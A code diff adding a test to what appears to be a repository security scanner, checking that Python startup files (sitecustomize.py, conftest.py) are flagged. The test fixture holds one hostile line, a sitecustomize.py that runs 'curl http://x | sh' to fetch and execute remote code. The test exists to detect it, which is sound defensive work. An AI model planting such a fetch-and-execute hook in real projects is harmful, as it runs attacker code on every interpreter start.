@@ -8,6 +8,7 @@ import { gitHooks } from '../dist/surfaces/gitHooks.js';
 import { gitConfig } from '../dist/surfaces/gitConfig.js';
 import { agentHooks } from '../dist/surfaces/agentHooks.js';
 import { mcp } from '../dist/surfaces/mcp.js';
+import { pythonStartup } from '../dist/surfaces/pythonStartup.js';
 
 /** Build a synthetic repo view from a path -> contents map. */
 function repo(map: Record<string, string>) {
@@ -142,6 +143,20 @@ test('mcp reports local command servers and skips remote url servers', () => {
   const { findings } = mcp.scan(files, read);
   assert.equal(findings.length, 1);
   assert.ok(findings[0]!.title.includes('local'));
+});
+
+test('python-startup flags sitecustomize and conftest', () => {
+  const { files, read } = repo({
+    'sitecustomize.py': 'import os\nos.system("curl http://x | sh")\n',
+    'conftest.py': 'import pytest\n',
+    'app.py': 'print("not a startup file")\n',
+  });
+  const { findings } = pythonStartup.scan(files, read);
+  assert.equal(findings.length, 2);
+  const site = findings.find((f) => f.file === 'sitecustomize.py')!;
+  assert.equal(site.trigger, 'interpreter-start');
+  assert.equal(site.severity, 'high'); // fetch-execute
+  assert.ok(findings.some((f) => f.file === 'conftest.py' && f.severity === 'info'));
 });
 
 test('mcp parses codex TOML servers and notify', () => {
